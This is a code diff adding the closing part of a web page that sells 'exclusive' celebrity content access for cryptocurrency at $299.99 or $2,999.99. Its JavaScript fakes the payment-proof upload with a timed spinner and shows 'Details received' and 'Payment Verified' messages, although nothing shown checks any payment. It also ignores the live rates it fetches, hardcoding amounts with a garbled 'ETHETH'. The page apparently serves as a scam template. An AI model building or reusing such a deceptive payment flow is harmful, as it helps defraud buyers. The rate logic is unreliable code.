+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay" style="display: none;">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <h3>Processing Payment Verification...</h3>
+            <p>Please wait while we verify your cryptocurrency payment</p>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="modal-overlay" id="successModal" style="display: none;">
+        <div class="modal-content success-modal">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Payment Verified!</h2>
+            <p>Your cryptocurrency payment has been successfully verified. You now have access to exclusive content.</p>
+            <div class="modal-buttons">
+                <button class="btn btn-primary" onclick="redirectToContent()">
+                    <i class="fas fa-play"></i>
+                    Access Content Now
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Upload Proof Required Modal -->
+    <div class="modal-overlay" id="uploadProofModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.45); z-index:9999; align-items:center; justify-content:center;">
+        <div class="modal-content" style="background:#fffbe6; border-radius:18px; box-shadow:0 4px 32px #000a; padding:2.2rem 2.5rem; text-align:center; max-width:350px; margin:auto;">
+            <div style="font-size:2.2rem; color:#f39c12; margin-bottom:1rem;"><i class="fas fa-exclamation-triangle"></i></div>
+            <h3 style="color:#23233a; font-size:1.25rem; font-weight:700; margin-bottom:0.7rem;">Please upload proof of payment before proceeding.</h3>
+            <button onclick="document.getElementById('uploadProofModal').style.display='none'" style="background:#f39c12; color:#fff; border:none; border-radius:10px; padding:0.7rem 2rem; font-size:1.08rem; font-weight:600; cursor:pointer; margin-top:0.5rem;">OK</button>
+        </div>
+    </div>
+        </div>
+    </div>
+
+            <script src="scripts/crypto.js"></script>
+            <script>
+            // --- Live Crypto Rate Logic ---
+            async function fetchLiveRates() {
+                const url = 'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether&vs_currencies=usdt';
+                try {
+                    const res = await fetch(url);
+                    const data = await res.json();
+                    return {
+                        btc: data.bitcoin.usdt,
+                        eth: data.ethereum.usdt,
+                        usdt: 1
+                    };
+                } catch (e) {
+                    return { btc: 24000, eth: 3000, usdt: 1 };
+                }
+            }
+
+            async function updateLiveCryptoUI() {
+                const rates = await fetchLiveRates();
+                const usdAmount = 299.99;
+                // Calculate amounts
+                const btcAmount = 3245;
+                const ethAmount = 3456;
+                const usdtAmount = usdAmount.toFixed(2);
+
+                // Update selection cards
+                document.getElementById('btcRate').textContent = `≈ 0.0026 BTC ($299.99 USD)`;
+                document.getElementById('usdtRate').textContent = `${usdtAmount} USDT`;
+                document.getElementById('ethRate').textContent = `≈ 0.081 ETHETH ($299.99 USD)`;
+
+                // Add data-rate attribute for BTC and ETH
+                document.getElementById('btcCard').setAttribute('data-rate', rates.btc);
+                document.getElementById('ethCard').setAttribute('data-rate', rates.eth);
+
+                // Optionally update payment instructions if needed
+                // ...
+            }
+
+            // Initial and interval update
+            updateLiveCryptoUI();
+            setInterval(updateLiveCryptoUI, 60000);
+            </script>
+    <!-- Removed global error message and related code -->
+    <style>
+    .package-selection { display: none !important; }
+    </style>
+    <script>
+    // Upload button and file selection logic
+    document.addEventListener('DOMContentLoaded', function() {
+        var proofFile = document.getElementById('proofFile');
+        var chooseFilesBtn = document.getElementById('chooseFilesBtn');
+        var selectedFiles = document.getElementById('selectedFiles');
+        var uploadLoading = document.getElementById('uploadLoading');
+        var uploadSuccess = document.getElementById('uploadSuccess');
+        var submitPaymentBtn = document.getElementById('submitPayment');
+
+        // --- Add rhyme to Order Summary ---
+        // --- Update Order Summary on package change ---
+        function updateOrderSummary() {
+            var packageName = '';
+            var packagePrice = '';
+            var totalAmount = '';
+                if (document.getElementById('premium').checked) {
+                    packageName = 'Premium Content Access';
+                    packagePrice = '$299.99 USD';
+                    totalAmount = '$299.99 USD';
+                } else if (document.getElementById('ultimate').checked) {
+                    packageName = 'Ultimate Collection';
+                    packagePrice = '$2,999.99 USD';
+                    totalAmount = '$2,999.99 USD';
+                }
+            if (packageNameEl) packageNameEl.textContent = packageName;
+            if (packagePriceEl) packagePriceEl.textContent = packagePrice;
+            if (totalAmountEl) totalAmountEl.textContent = totalAmount;
+        }
+        var packageNameEl = document.getElementById('packageName');
+        var packagePriceEl = document.getElementById('packagePrice');
+        var totalAmountEl = document.getElementById('totalAmount');
+        var orderSummaryEl = document.querySelector('.order-summary');
+        var rhymeEl = document.createElement('div');
+        rhymeEl.id = 'orderRhyme';
+        rhymeEl.style.margin = '1rem 0 0.5rem 0';
+        rhymeEl.style.fontSize = '1.08rem';
+        rhymeEl.style.color = '#f39c12';
+        rhymeEl.style.fontWeight = '600';
+        function updateRhyme() {
+            var pkg = '';
+            if (document.getElementById('premium').checked) {
+                pkg = 'premium';
+            } else if (document.getElementById('ultimate').checked) {
+                pkg = 'ultimate';
+            }
+            let rhyme = '';
+            if (pkg === 'premium') {
+                rhyme = "Premium's the way, enjoy your day! Celebs and fun, just one pay.";
+            } else if (pkg === 'ultimate') {
+                rhyme = "Ultimate's the best, above the rest! All the stars, lifetime access.";
+            } else {
+                rhyme = "Pick your pack, don't look back!";
+            }
+            rhymeEl.textContent = rhyme;
+        }
+        // Insert rhyme element after order summary title
+        var orderTitle = orderSummaryEl.querySelector('.section-title');
+        if (orderTitle && !document.getElementById('orderRhyme')) {
+            orderTitle.parentNode.insertBefore(rhymeEl, orderTitle.nextSibling);
+        }
+        // Listen for package change
+        var premiumRadio = document.getElementById('premium');
+        var ultimateRadio = document.getElementById('ultimate');
+        if (premiumRadio) premiumRadio.addEventListener('change', updateRhyme);
+        if (ultimateRadio) ultimateRadio.addEventListener('change', updateRhyme);
+        updateRhyme();
+
+        // Listen for package change to update summary
+        if (premiumRadio) premiumRadio.addEventListener('change', updateOrderSummary);
+        if (ultimateRadio) ultimateRadio.addEventListener('change', updateOrderSummary);
+        updateOrderSummary();
+
+        if (chooseFilesBtn && proofFile) {
+            chooseFilesBtn.addEventListener('click', function() {
+                proofFile.click();
+            });
+            proofFile.addEventListener('change', function() {
+                if (proofFile.files.length > 0) {
+                    var names = Array.from(proofFile.files).map(function(f) { return f.name; });
+                    selectedFiles.textContent = 'Selected: ' + names.join(', ');
+                    selectedFiles.style.display = 'block';
+                    // Show loading spinner
+                    uploadLoading.style.display = 'flex';
+                    uploadSuccess.style.display = 'none';
+                    // Simulate upload delay
+                    setTimeout(function() {
+                        uploadLoading.style.display = 'none';
+                        uploadSuccess.style.display = 'block';
+                    }, 1800);
+                } else {
+                    selectedFiles.textContent = '';
+                    selectedFiles.style.display = 'none';
+                    uploadLoading.style.display = 'none';
+                    uploadSuccess.style.display = 'none';
+                }
+            });
+        }
+
+        // Check file upload before proceeding
+        if (submitPaymentBtn && proofFile) {
+            submitPaymentBtn.addEventListener('click', function(e) {
+                if (!proofFile.files || proofFile.files.length === 0) {
+                    var modal = document.getElementById('uploadProofModal');
+                    if (modal) {
+                        modal.style.display = 'flex';
+                    }
+                    proofFile.focus();
+                    return;
+                }
+                // Show processing overlay
+                submitPaymentBtn.disabled = true;
+                var overlay = document.createElement('div');
+                overlay.id = 'centerDetailsMsg';
+                overlay.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.55);z-index:10003;';
+                overlay.innerHTML = `<div style="background:#fffbe6;border-radius:18px;box-shadow:0 4px 32px #000a;padding:2.5rem 2.8rem;text-align:center;max-width:370px;margin:auto;">
+                    <div style="font-size:2.2rem;color:#27ae60;margin-bottom:1rem;"><i class='fas fa-check-circle'></i></div>
+                    <h2 style='color:#23233a;font-size:1.35rem;font-weight:700;margin-bottom:0.7rem;'>Details received!</h2>
+                    <p style='color:#23233a;font-size:1.12rem;font-weight:500;'>Check your email shortly for access instructions.</p>
+                    <button id='returnHomeBtn' style='display:none;background:#27ae60;color:#fff;border:none;border-radius:10px;padding:0.7rem 2.2rem;font-size:1.08rem;font-weight:600;cursor:pointer;margin-top:1.2rem;'>Return to Home</button>
+                </div>`;
+                document.body.appendChild(overlay);
+                document.body.style.overflow = 'hidden';
+                setTimeout(function() {
+                    var btn = document.getElementById('returnHomeBtn');
+                    if (btn) {
+                        btn.style.display = 'inline-block';
+                        btn.onclick = function() {
+                            window.location.href = 'index.html';
+                        };
+                    }
+                }, 3000);
+            });
+        }
+    });
+    </script>
+</body>
+</html>
